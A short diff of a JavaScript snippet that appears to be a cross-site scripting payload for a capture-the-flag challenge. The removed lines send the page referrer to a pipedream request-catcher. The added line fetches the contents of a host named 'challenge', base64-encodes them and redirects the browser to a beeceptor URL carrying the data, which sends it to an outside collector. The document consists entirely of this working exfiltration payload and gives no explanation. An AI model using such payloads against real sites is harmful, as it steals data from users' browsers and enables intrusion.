@@ -1,4 +1,1 @@
-// alert(1)
-var ref = document.reffere;
-var endpoint = 'https://eo42ae89zrpr6ww.m.pipedream.net?hoge=' + ref;
-fetch(endpoint);
+fetch("http://challenge:8080/").then(res => res.text()).then(data => location.replace('https://xss-test.free.beeceptor.com/?c='+btoa(data)))//
